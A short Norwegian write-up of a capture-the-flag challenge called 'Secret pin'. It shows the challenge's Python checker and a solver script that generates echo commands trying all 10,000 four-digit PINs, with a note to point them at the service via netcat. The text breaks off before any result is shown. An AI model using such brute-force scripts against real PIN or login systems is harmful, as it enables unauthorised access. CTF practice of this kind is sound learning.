Secret pin er en pure brute-force challange der poenget er 
å lage et script som som går gjennom alle muligheter for en
4-siffers pinkode.

med oppgaven kommer denne fila:

# This is a bruteforce challange
secret_pin = open("pin.txt", "r").read()

pin = input("Pincode: ")

if len(pin) == 4:
    if pin == secret_pin:
        print("Congrats you solved the challange!")
        flag = open("flag.txt", "r").read()
        print(flag)

i fila ser man at koden bruker to filer som er skjult: flag.txt og pin.txt

for å løse den lager man et script lignende dette:
from itertools import product

nums = "0123456789"

pin_tries = product(nums, repeat=4)

for pin in pin_tries:
    pin = "".join(pin)
    print(f"echo {pin} | python secret_pin.py")
#python secret_pin.py må endres til netcat når man setter den opp riktig

hvis man kjører dette scriptet og legger det til filen result.txt
hvis man da kjører bash result.txt og legegr det inn i en fil får man ca dette resultatet:
